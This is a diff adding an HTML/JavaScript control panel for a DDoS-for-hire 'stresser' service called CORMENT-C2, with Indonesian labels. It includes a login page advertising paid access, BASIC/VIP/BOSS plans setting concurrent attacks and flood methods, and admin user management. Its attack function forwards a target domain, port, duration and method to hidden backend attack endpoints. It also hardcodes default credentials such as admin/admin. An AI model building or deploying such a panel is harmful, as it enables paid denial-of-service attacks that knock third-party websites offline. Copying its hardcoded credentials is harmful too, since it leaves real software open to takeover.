@@ -1,0 +1,651 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORMENT-C2 STRESSER - POWERFULL STRESSER</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #0a0c10;
+            color: #eef4ff;
+            min-height: 100vh;
+        }
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1rem 2rem;
+            background: #0a0c10e6;
+            backdrop-filter: blur(12px);
+            border-bottom: 1px solid #2c2f36;
+        }
+        .logo {
+            font-size: 1.7rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #00c6fb, #005bea);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        .user-info { display: flex; gap: 1rem; align-items: center; }
+        .btn-outline {
+            border: 1px solid #3b82f6;
+            background: transparent;
+            padding: 0.5rem 1.2rem;
+            border-radius: 30px;
+            color: #3b82f6;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        .btn-primary {
+            background: linear-gradient(95deg, #3b82f6, #2563eb);
+            border: none;
+            padding: 0.7rem 1.5rem;
+            border-radius: 40px;
+            font-weight: bold;
+            color: white;
+            cursor: pointer;
+        }
+        .btn-secondary { background: #2d3748; border: none; padding: 0.5rem 1.2rem; border-radius: 30px; color: white; cursor: pointer; }
+        .container { max-width: 1280px; margin: 0 auto; padding: 2rem 1.5rem; }
+        .card {
+            background: #0f1117;
+            border-radius: 28px;
+            border: 1px solid #282c34;
+            padding: 2rem;
+            margin-bottom: 2rem;
+        }
+        .form-group { margin-bottom: 1.2rem; }
+        label { display: block; margin-bottom: 0.5rem; font-weight: 500; }
+        input, select {
+            width: 100%;
+            padding: 0.8rem 1rem;
+            background: #1a1e2a;
+            border: 1px solid #2e3440;
+            border-radius: 16px;
+            color: white;
+            font-size: 1rem;
+        }
+        .checkbox-group {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.8rem;
+            background: #1a1e2a;
+            padding: 1rem;
+            border-radius: 16px;
+            border: 1px solid #2e3440;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+        .checkbox-group label { display: inline-flex; align-items: center; gap: 0.4rem; font-weight: normal; cursor: pointer; }
+        .warning-badge {
+            background: #7f1a1a80;
+            border-left: 4px solid #ef4444;
+            padding: 0.8rem;
+            border-radius: 14px;
+            margin-top: 1rem;
+            font-size: 0.8rem;
+        }
+        .success-badge {
+            background: #14532d80;
+            border-left: 4px solid #22c55e;
+            padding: 0.8rem;
+            border-radius: 14px;
+            margin-top: 1rem;
+            font-size: 0.8rem;
+        }
+        .info-badge {
+            background: #1e3a5f80;
+            border-left: 4px solid #3b82f6;
+            padding: 0.8rem;
+            border-radius: 14px;
+            margin-top: 1rem;
+            font-size: 0.8rem;
+            text-align: center;
+        }
+        .row-2col { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+        .endpoint-list {
+            background: #0a0c10;
+            border-radius: 20px;
+            padding: 1rem;
+            margin-top: 1rem;
+        }
+        .endpoint-item {
+            background: #1a1e2a;
+            padding: 0.5rem 1rem;
+            border-radius: 12px;
+            margin-bottom: 0.5rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-family: monospace;
+            font-size: 0.8rem;
+        }
+        .del-endpoint { background: #dc2626; border: none; color: white; border-radius: 20px; padding: 0.2rem 0.8rem; cursor: pointer; }
+        table { width: 100%; border-collapse: collapse; }
+        th, td { text-align: left; padding: 0.75rem; border-bottom: 1px solid #2c2f36; }
+        th { color: #8b93ab; }
+        .page { display: none; }
+        .active-page { display: block; }
+        .btn-small { padding: 0.2rem 0.6rem; font-size: 0.7rem; margin-left: 0.3rem; }
+        .server-stats {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+            background: #1a1e2a;
+            border-radius: 20px;
+            padding: 1rem;
+            margin-top: 0.5rem;
+        }
+        .stat-box {
+            text-align: center;
+        }
+        .stat-number {
+            font-size: 2.5rem;
+            font-weight: bold;
+            color: #22c55e;
+        }
+        @media (max-width: 700px) { .row-2col { grid-template-columns: 1fr; } .navbar { flex-direction: column; gap: 0.8rem; } }
+    </style>
+</head>
+<body>
+
+<div id="loginPage" class="page active-page">
+    <div class="container" style="max-width: 500px; margin-top: 5rem;">
+        <div class="card">
+            <h2><i class="fas fa-lock"></i> Login</h2>
+            <div class="form-group">
+                <label>Username</label>
+                <input type="text" id="loginUsername" placeholder="username">
+            </div>
+            <div class="form-group">
+                <label>Password</label>
+                <input type="password" id="loginPassword" placeholder="password">
+            </div>
+            <button class="btn-primary" id="loginBtn" style="width:100%">Login</button>
+            <div class="warning-badge" style="margin-top:1rem;">
+                BUY AKSES USER DM @cormentc2<br>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div id="appPage" class="page">
+    <nav class="navbar">
+        <div class="logo"><i class="fas fa-bolt"></i> CORMENT-C2 STRESSER - POWERFULL STRESSER</div>
+        <div class="user-info">
+            <span id="currentUserSpan"></span>
+            <button class="btn-outline" id="logoutBtn"><i class="fas fa-sign-out-alt"></i> Logout</button>
+        </div>
+    </nav>
+
+    <div class="container">
+        <!-- Dashboard User Biasa (tanpa log) -->
+        <div id="userDashboard" class="page active-page">
+            <div class="card">
+                <h2><i class="fas fa-skull-crosswalk"></i> Launch Attack CORMENT-C2 STRESSER</h2>
+                <div id="userLimitsInfo" class="success-badge" style="margin-bottom:1rem;"></div>
+
+                <div class="info-badge" style="margin-bottom:1rem;">
+                    <div class="server-stats">
+                        <div class="stat-box">
+                            <div class="stat-number" id="serverCountDisplay">0</div>
+                            <div><i class="fas fa-server"></i> Server Active</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="row-2col">
+                    <div class="form-group">
+                        <label>Target Website (Domain)</label>
+                        <input type="text" id="userTarget" placeholder="example.com" value="example.com">
+                    </div>
+                    <div class="form-group">
+                        <label>Port</label>
+                        <input type="number" id="userPort" value="443">
+                    </div>
+                </div>
+                <div class="row-2col">
+                    <div class="form-group">
+                        <label>Duration (seconds)</label>
+                        <input type="number" id="userDuration" value="30" min="5" max="3600">
+                    </div>
+                    <div class="form-group">
+                        <label>Method (pilih dari yang diizinkan)</label>
+                        <select id="userMethod"></select>
+                    </div>
+                </div>
+                <button class="btn-primary" id="userAttackBtn"><i class="fas fa-play"></i> Launch Attack</button>
+                <div class="warning-badge">CORMENT-C2 STRESSER - POWERFULL STRESSER – Tidak ada serangan nyata.</div>
+            </div>
+        </div>
+
+        <!-- Dashboard Admin -->
+        <div id="adminDashboard" class="page">
+            <div class="card">
+                <h2><i class="fas fa-users-cog"></i> Manajemen User - Batasan Concurrent Attack</h2>
+                <div class="form-group">
+                    <label>Pilih PLAN (otomatis mengisi form)</label>
+                    <select id="planSelect">
+                        <option value="">-- Pilih Plan --</option>
+                        <option value="BASIC">BASIC (1 concurrent)</option>
+                        <option value="VIP">VIP (2 concurrent)</option>
+                        <option value="BOSS">BOSS (4 concurrent)</option>
+                    </select>
+                </div>
+                <div class="row-2col">
+                    <div class="form-group">
+                        <label>Username baru</label>
+                        <input type="text" id="newUsername" placeholder="username">
+                    </div>
+                    <div class="form-group">
+                        <label>Password</label>
+                        <input type="text" id="newPassword" placeholder="password">
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>Allowed Methods (centang)</label>
+                    <div id="methodsCheckboxGroup" class="checkbox-group"></div>
+                </div>
+                <div class="row-2col">
+                    <div class="form-group">
+                        <label>Max Duration (detik)</label>
+                        <input type="number" id="newMaxDuration" value="60">
+                    </div>
+                    <div class="form-group">
+                        <label>Max Concurrent Attacks (jumlah serangan bersamaan)</label>
+                        <input type="number" id="newConcurrentLimit" value="1">
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>Expired Date (YYYY-MM-DD)</label>
+                    <input type="date" id="newExpired">
+                </div>
+                <button class="btn-primary" id="addUserBtn"><i class="fas fa-user-plus"></i> Tambah User</button>
+            </div>
+
+            <div class="card">
+                <h3>Daftar User & Concurrent Limit</h3>
+                <div style="overflow-x:auto;">
+                    <table id="userTable">
+                        <thead>
+                            <tr><th>Username</th><th>Role</th><th>Plan</th><th>Methods</th><th>Max Dur</th><th>Concurrent Limit</th><th>Expired</th><th>Aksi</th></tr>
+                        </thead>
+                        <tbody></tbody>
+                    </table>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>Konfigurasi Global Endpoint (hanya untuk admin)</h3>
+                <div class="row-2col" style="gap:0.8rem;">
+                    <input type="text" id="globalEndpointInput" placeholder="https://httpbin.org/get">
+                    <button id="addGlobalEndpointBtn" class="btn-secondary">Tambah Endpoint</button>
+                </div>
+                <div id="globalEndpointsContainer" class="endpoint-list"></div>
+                <small>Semua user akan menggunakan endpoint ini saat attack (tidak terlihat oleh user biasa).</small>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    const ALL_METHODS = [
+        "bypass", "tls", "browser", "browserv1", "flood",
+        "holdv1", "bypassv2", "httpraw", "glory", "h2grok", "flow"
+    ];
+
+    const PLANS = {
+        BASIC: { allowedMethods: ["bypass", "tls", "glory"], maxDuration: 120, concurrentLimit: 1, expiredOffsetDays: 30 },
+        VIP: { allowedMethods: ["bypass", "tls", "glory", "flood", "flow", "h2grok"], maxDuration: 300, concurrentLimit: 2, expiredOffsetDays: 30 },
+        BOSS: { allowedMethods: [...ALL_METHODS], maxDuration: 500, concurrentLimit: 4, expiredOffsetDays: 30 }
+    };
+
+    function getExpiredDateFromNow(daysOffset) {
+        const date = new Date();
+        date.setDate(date.getDate() + daysOffset);
+        return date.toISOString().split('T')[0];
+    }
+
+    const STORAGE_USERS = 'stresser_users_v3'; 
+    const STORAGE_ENDPOINTS = 'stresser_global_endpoints';
+    const STORAGE_SESSION = 'stresser_session';
+
+    let users = [];
+    let globalEndpoints = [];
+    let currentUser = null;
+    let activeAttacksMap = new Map();
+
+    function getActiveAttackCount(username) { return activeAttacksMap.get(username) || 0; }
+    function incrementActiveAttack(username) { activeAttacksMap.set(username, getActiveAttackCount(username) + 1); }
+    function decrementActiveAttack(username) {
+        const current = getActiveAttackCount(username);
+        activeAttacksMap.set(username, current > 0 ? current - 1 : 0);
+        if (currentUser && currentUser.username === username && currentUser.role === 'user') {
+            updateUserConcurrentDisplay();
+            updateServerCountDisplay();
+        }
+    }
+
+    function updateUserConcurrentDisplay() {
+        const active = getActiveAttackCount(currentUser.username);
+        const limit = currentUser.limits.concurrentLimit;
+        const infoDiv = document.getElementById('userLimitsInfo');
+        if (infoDiv) {
+            infoDiv.innerHTML = `<i class="fas fa-info-circle"></i> Batasan Anda: <strong>Metode: ${currentUser.limits.allowedMethods.join(', ')}</strong> | Maks durasi: ${currentUser.limits.maxDuration} detik | <strong>Serangan Bersamaan: ${active} / ${limit}</strong> | Expired: ${currentUser.limits.expired}`;
+        }
+        const attackBtn = document.getElementById('userAttackBtn');
+        if (attackBtn) {
+            attackBtn.disabled = active >= limit;
+            attackBtn.style.opacity = active >= limit ? '0.5' : '1';
+        }
+    }
+
+    function updateServerCountDisplay() {
+        const span = document.getElementById('serverCountDisplay');
+        if (span) span.innerText = globalEndpoints.length;
+    }
+
+    function saveUsers() { localStorage.setItem(STORAGE_USERS, JSON.stringify(users)); }
+    
+    function loadUsers() {
+        const stored = localStorage.getItem(STORAGE_USERS);
+        if (stored) {
+            users = JSON.parse(stored);
+        } else {
+            users = [];
+        }
+        
+        // === PASTIKAN USER DEFAULT SELALU ADA DENGAN PASSWORD BENAR ===
+        const defaultUsers = [
+            { username: 'admin', password: 'admin', role: 'admin', limits: { allowedMethods: [...ALL_METHODS], maxDuration: 3600, concurrentLimit: 999, expired: '2099-12-31' }, plan: null },
+            { username: 'user1', password: 'user1', role: 'user', limits: { ...PLANS.BASIC, expired: getExpiredDateFromNow(30) }, plan: 'BASIC' },
+            { username: 'corment', password: '132', role: 'user', limits: { ...PLANS.BASIC, expired: getExpiredDateFromNow(30) }, plan: 'BASIC' },
+            { username: '9999ijnnn', password: 'i9oknn9', role: 'user', limits: { ...PLANS.BASIC, expired: getExpiredDateFromNow(30) }, plan: 'BASIC' }
+        ];
+        
+        for (let def of defaultUsers) {
+            const existingIndex = users.findIndex(u => u.username === def.username);
+            if (existingIndex === -1) {
+                users.push(def);
+            } else {
+                // Update password, role, dan limits (terutama untuk admin)
+                users[existingIndex].password = def.password;
+                if (def.role === 'admin') users[existingIndex].role = 'admin';
+                if (!users[existingIndex].limits) users[existingIndex].limits = def.limits;
+                else {
+                    // pastikan allowedMethods ada
+                    if (!users[existingIndex].limits.allowedMethods) users[existingIndex].limits.allowedMethods = def.limits.allowedMethods;
+                    if (!users[existingIndex].limits.maxDuration) users[existingIndex].limits.maxDuration = def.limits.maxDuration;
+                    if (!users[existingIndex].limits.concurrentLimit) users[existingIndex].limits.concurrentLimit = def.limits.concurrentLimit;
+                    if (!users[existingIndex].limits.expired) users[existingIndex].limits.expired = def.limits.expired;
+                }
+            }
+        }
+        
+        // Pastikan semua user punya concurrentLimit dan attacksUsed
+        users = users.map(u => {
+            if (!u.limits) u.limits = { allowedMethods: ["bypass"], maxDuration: 60, concurrentLimit: 1, expired: getExpiredDateFromNow(30) };
+            if (!u.limits.concurrentLimit && u.limits.concurrentLimit !== 0) u.limits.concurrentLimit = 1;
+            if (u.attacksUsed === undefined) u.attacksUsed = 0;
+            return u;
+        });
+        saveUsers();
+    }
+
+    function loadGlobalEndpoints() {
+        const stored = localStorage.getItem(STORAGE_ENDPOINTS);
+        globalEndpoints = stored ? JSON.parse(stored) : ['https://httpbin.org/get'];
+        localStorage.setItem(STORAGE_ENDPOINTS, JSON.stringify(globalEndpoints));
+        renderGlobalEndpoints();
+        updateServerCountDisplay();
+    }
+    function saveGlobalEndpoints() {
+        localStorage.setItem(STORAGE_ENDPOINTS, JSON.stringify(globalEndpoints));
+        renderGlobalEndpoints();
+        updateServerCountDisplay();
+    }
+    function renderGlobalEndpoints() {
+        const container = document.getElementById('globalEndpointsContainer');
+        if (!container) return;
+        container.innerHTML = '';
+        if (globalEndpoints.length === 0) { container.innerHTML = '<div style="color:#888; padding:1rem;">Belum ada endpoint. Tambahkan.</div>'; return; }
+        globalEndpoints.forEach((ep, idx) => {
+            const div = document.createElement('div');
+            div.className = 'endpoint-item';
+            div.innerHTML = `<span>${escapeHtml(ep)}</span><button class="del-endpoint" data-endpoint-idx="${idx}">Hapus</button>`;
+            container.appendChild(div);
+        });
+        document.querySelectorAll('.del-endpoint').forEach(btn => {
+            btn.addEventListener('click', (e) => {
+                const idx = parseInt(btn.dataset.endpointIdx);
+                globalEndpoints.splice(idx, 1);
+                saveGlobalEndpoints();
+                addAdminLog(`Endpoint dihapus. Tersisa ${globalEndpoints.length}`);
+            });
+        });
+    }
+    function escapeHtml(str) { return str.replace(/[&<>]/g, m => ({ '&':'&amp;', '<':'&lt;', '>':'&gt;' }[m])); }
+
+    function renderMethodsCheckbox(selected = []) {
+        const container = document.getElementById('methodsCheckboxGroup');
+        if (!container) return;
+        container.innerHTML = '';
+        ALL_METHODS.forEach(m => {
+            const label = document.createElement('label');
+            const cb = document.createElement('input');
+            cb.type = 'checkbox'; cb.value = m; cb.checked = selected.includes(m);
+            label.appendChild(cb); label.appendChild(document.createTextNode(' ' + m));
+            container.appendChild(label);
+        });
+    }
+    function getSelectedMethods() {
+        return Array.from(document.querySelectorAll('#methodsCheckboxGroup input:checked')).map(cb => cb.value);
+    }
+    function onPlanChange() {
+        const plan = PLANS[document.getElementById('planSelect').value];
+        if (plan) {
+            renderMethodsCheckbox(plan.allowedMethods);
+            document.getElementById('newMaxDuration').value = plan.maxDuration;
+            document.getElementById('newConcurrentLimit').value = plan.concurrentLimit;
+            document.getElementById('newExpired').value = getExpiredDateFromNow(plan.expiredOffsetDays);
+        } else {
+            renderMethodsCheckbox([]);
+            document.getElementById('newMaxDuration').value = 60;
+            document.getElementById('newConcurrentLimit').value = 1;
+            document.getElementById('newExpired').value = '';
+        }
+    }
+
+    function renderUserTable() {
+        const tbody = document.querySelector('#userTable tbody');
+        if (!tbody) return;
+        tbody.innerHTML = '';
+        users.forEach((user, idx) => {
+            const row = tbody.insertRow();
+            row.insertCell(0).innerText = user.username;
+            row.insertCell(1).innerText = user.role;
+            row.insertCell(2).innerText = user.plan || '-';
+            row.insertCell(3).innerText = user.limits.allowedMethods.join(', ');
+            row.insertCell(4).innerText = user.limits.maxDuration;
+            row.insertCell(5).innerText = user.limits.concurrentLimit;
+            row.insertCell(6).innerText = user.limits.expired;
+            const actions = row.insertCell(7);
+            if (user.username !== 'admin') {
+                const editBtn = document.createElement('button');
+                editBtn.innerText = 'Edit Concurrent';
+                editBtn.className = 'btn-small';
+                editBtn.style.background = '#f59e0b';
+                editBtn.onclick = () => {
+                    let newLimit = prompt(`Ubah concurrent limit untuk ${user.username} (saat ini ${user.limits.concurrentLimit}):`, user.limits.concurrentLimit);
+                    if (newLimit && !isNaN(parseInt(newLimit)) && parseInt(newLimit) >= 0) {
+                        user.limits.concurrentLimit = parseInt(newLimit);
+                        saveUsers(); renderUserTable();
+                        addAdminLog(`Concurrent limit ${user.username} diubah menjadi ${newLimit}`);
+                    }
+                };
+                actions.appendChild(editBtn);
+                const delBtn = document.createElement('button');
+                delBtn.innerText = 'Hapus';
+                delBtn.className = 'btn-small';
+                delBtn.style.background = '#dc2626';
+                delBtn.onclick = () => { if (confirm(`Hapus user ${user.username}?`)) { users.splice(idx, 1); saveUsers(); renderUserTable(); addAdminLog(`User ${user.username} dihapus.`); } };
+                actions.appendChild(delBtn);
+            } else actions.innerText = '-';
+        });
+    }
+    function addAdminLog(msg) { console.log(msg); alert(msg); }
+    function isUserExpired(user) { return new Date().toISOString().split('T')[0] > user.limits.expired; }
+
+    function login(username, password) {
+        const user = users.find(u => u.username === username && u.password === password);
+        if (!user) {
+            alert('Username atau password salah.');
+            return false;
+        }
+        if (isUserExpired(user)) { alert('Akun sudah expired.'); return false; }
+        currentUser = { ...user };
+        localStorage.setItem(STORAGE_SESSION, JSON.stringify({ username: currentUser.username, role: currentUser.role }));
+        return true;
+    }
+    function logout() {
+        localStorage.removeItem(STORAGE_SESSION);
+        currentUser = null;
+        document.getElementById('loginPage').classList.add('active-page');
+        document.getElementById('appPage').classList.remove('active-page');
+        document.getElementById('userDashboard').classList.remove('active-page');
+        document.getElementById('adminDashboard').classList.remove('active-page');
+    }
+    function checkSession() {
+        const session = localStorage.getItem(STORAGE_SESSION);
+        if (session) {
+            const { username, role } = JSON.parse(session);
+            const user = users.find(u => u.username === username);
+            if (user && !isUserExpired(user)) {
+                currentUser = { ...user };
+                document.getElementById('loginPage').classList.remove('active-page');
+                document.getElementById('appPage').classList.add('active-page');
+                if (currentUser.role === 'admin') {
+                    document.getElementById('adminDashboard').classList.add('active-page');
+                    document.getElementById('userDashboard').classList.remove('active-page');
+                    renderUserTable(); loadGlobalEndpoints(); renderMethodsCheckbox([]);
+                    document.getElementById('planSelect').value = '';
+                } else {
+                    document.getElementById('userDashboard').classList.add('active-page');
+                    document.getElementById('adminDashboard').classList.remove('active-page');
+                    initUserDashboard();
+                }
+                document.getElementById('currentUserSpan').innerHTML = `<i class="fas fa-user"></i> ${currentUser.username} (${currentUser.role})`;
+                return true;
+            } else { logout(); return false; }
+        }
+        return false;
+    }
+    function initUserDashboard() {
+        document.getElementById('userDuration').max = currentUser.limits.maxDuration;
+        const methodSelect = document.getElementById('userMethod');
+        methodSelect.innerHTML = '';
+        currentUser.limits.allowedMethods.forEach(m => { const opt = document.createElement('option'); opt.value = m; opt.innerText = m; methodSelect.appendChild(opt); });
+        updateUserConcurrentDisplay();
+        updateServerCountDisplay();
+    }
+
+    // Fungsi attack tanpa log
+    async function performAttack(target, port, duration, method) {
+        if (globalEndpoints.length === 0) return false;
+        const fetchWithTimeout = (url, timeoutMs = 3000) => {
+            return Promise.race([
+                fetch(url),
+                new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), timeoutMs))
+            ]);
+        };
+        const promises = globalEndpoints.map(async (endpoint) => {
+            const url = `${endpoint}?target=${encodeURIComponent(target)}&port=${encodeURIComponent(port)}&time=${encodeURIComponent(duration)}&methods=${encodeURIComponent(method)}`;
+            try {
+                await fetchWithTimeout(url, 3000);
+            } catch (err) {}
+        });
+        await Promise.all(promises);
+        return true;
+    }
+
+    // Event attack user
+    document.addEventListener('click', async (e) => {
+        if (e.target && e.target.id === 'userAttackBtn' && currentUser && currentUser.role === 'user') {
+            const target = document.getElementById('userTarget').value.trim();
+            const port = parseInt(document.getElementById('userPort').value);
+            const duration = parseInt(document.getElementById('userDuration').value);
+            const method = document.getElementById('userMethod').value;
+            const active = getActiveAttackCount(currentUser.username);
+            const limit = currentUser.limits.concurrentLimit;
+
+            if (!target) { alert('Masukkan domain target'); return; }
+            if (isNaN(port) || port < 1 || port > 65535) { alert('Port tidak valid'); return; }
+            if (isNaN(duration) || duration <= 0) { alert('Durasi harus angka >0'); return; }
+            if (duration > currentUser.limits.maxDuration) { alert(`Durasi maksimal ${currentUser.limits.maxDuration} detik.`); return; }
+            if (!currentUser.limits.allowedMethods.includes(method)) { alert(`Metode ${method} tidak diizinkan.`); return; }
+            if (active >= limit) { alert(`Batas concurrent tercapai (${active}/${limit}). Tunggu serangan lain selesai.`); return; }
+
+            incrementActiveAttack(currentUser.username);
+            updateUserConcurrentDisplay();
+
+            const attackPromise = performAttack(target, port, duration, method);
+            setTimeout(() => {
+                decrementActiveAttack(currentUser.username);
+                updateUserConcurrentDisplay();
+            }, duration * 1000);
+            await attackPromise;
+        }
+    });
+
+    // Admin: tambah user
+    document.getElementById('addUserBtn')?.addEventListener('click', () => {
+        const username = document.getElementById('newUsername').value.trim();
+        const password = document.getElementById('newPassword').value.trim();
+        const maxDuration = parseInt(document.getElementById('newMaxDuration').value);
+        const concurrentLimit = parseInt(document.getElementById('newConcurrentLimit').value);
+        let expired = document.getElementById('newExpired').value;
+        const selectedMethods = getSelectedMethods();
+        const planSelected = document.getElementById('planSelect').value || null;
+
+        if (!username || !password) { alert('Username dan password harus diisi'); return; }
+        if (users.find(u => u.username === username)) { alert('Username sudah ada'); return; }
+        if (isNaN(maxDuration) || maxDuration <= 0) { alert('Durasi maks tidak valid'); return; }
+        if (isNaN(concurrentLimit) || concurrentLimit <= 0) { alert('Concurrent limit harus > 0'); return; }
+        if (selectedMethods.length === 0) { alert('Pilih minimal satu metode'); return; }
+        if (!expired) expired = getExpiredDateFromNow(30);
+
+        users.push({ username, password, role: 'user', limits: { allowedMethods: selectedMethods, maxDuration, concurrentLimit, expired }, plan: planSelected });
+        saveUsers(); renderUserTable();
+        addAdminLog(`User ${username} (${planSelected || 'Custom'}) ditambahkan. Concurrent limit: ${concurrentLimit}`);
+        document.getElementById('newUsername').value = ''; document.getElementById('newPassword').value = ''; document.getElementById('planSelect').value = '';
+        document.getElementById('newMaxDuration').value = '60'; document.getElementById('newConcurrentLimit').value = '1'; document.getElementById('newExpired').value = '';
+        renderMethodsCheckbox([]);
+    });
+
+    document.getElementById('addGlobalEndpointBtn')?.addEventListener('click', () => {
+        let newEp = document.getElementById('globalEndpointInput').value.trim();
+        if (!newEp) { alert('Masukkan endpoint'); return; }
+        if (!newEp.startsWith('http://') && !newEp.startsWith('https://')) { alert('Endpoint harus http:// atau https://'); return; }
+        if (globalEndpoints.includes(newEp)) { alert('Sudah ada'); return; }
+        globalEndpoints.push(newEp); saveGlobalEndpoints();
+        addAdminLog(`Endpoint ${newEp} ditambahkan.`);
+        document.getElementById('globalEndpointInput').value = '';
+    });
+
+    document.getElementById('loginBtn').addEventListener('click', () => { 
+        const user = document.getElementById('loginUsername').value;
+        const pass = document.getElementById('loginPassword').value;
+        if (login(user, pass)) checkSession(); 
+    });
+    document.getElementById('logoutBtn').addEventListener('click', logout);
+    document.getElementById('planSelect')?.addEventListener('change', onPlanChange);
+
+    loadUsers(); loadGlobalEndpoints(); checkSession();
+</script>
+</body>
+</html>
